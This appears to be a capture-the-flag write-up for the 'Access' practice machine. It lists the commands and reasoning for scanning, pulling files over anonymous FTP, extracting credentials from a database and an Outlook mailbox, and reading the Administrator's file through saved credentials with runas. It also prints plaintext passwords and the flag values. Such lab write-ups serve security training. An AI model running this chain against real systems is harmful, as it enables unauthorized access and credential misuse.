# Access - Easy

```shell
nmap -T4 -A 10.10.10.98

ftp 10.10.10.98
#anonymous login
#get both files

feroxbuster -u http://10.10.10.98 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#use mdbtools to view .mdb file
mdb-tables backup.mdb

telnet 10.10.10.98
#login using creds for security

cmdkey /list
#Administrator creds are stored

C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
#runas to use Admin saved creds
#and copy root.txt content to readable file

type root.txt
```

* Open ports & services:

  * 21 - ftp - Microsoft ftpd
  * 23 - telnet
  * 80 - http - Microsoft IIS httpd 7.5

* FTP allows anonymous login, so we can use ```get``` to transfer both files to our machine.

* We have two files - a zip file which requires a password, and a .mdb file.

* We can simultaneously explore the website, and enumerate for hidden directories.

* feroxbuster does not show any significant hidden directories; we can go back to the files found through ftp.

* We can use ```mdbtools``` to view the .mdb file; alternatively, we can use online tools to view the file.

* We have a table called ```auth_user``` with some entries - checking its content gives us 3 pairs of credentials:

  ```markdown
  engineer:access4u@security
  admin:admin
  backup_admin:admin
  ```

* As the .zip file was found in the engineer directory in FTP, we can use the engineer's password for the .zip file.

* This works and we have a .pst file now, which is an Outlook email folder.

* By viewing the .pst file online, we get an email which contains the creds security:4Cc3ssC0ntr0ller

* Now, we are able to login via telnet, using the above creds; user flag can be found in security's Desktop.

* We can check for stored creds using ```cmdkey```, and we can see that Administrator creds are stored.

* We can use runas along with the saved creds, and copy the root flag's contents to security's home directory.

* This way, we can read the root flag directly without privesc.

```markdown
1. User flag - dbf02aafdaa231b019bfdadd48c7a313

2. Root flag - ce3986c12d1ef0b1f7c593dc23c9b030
```
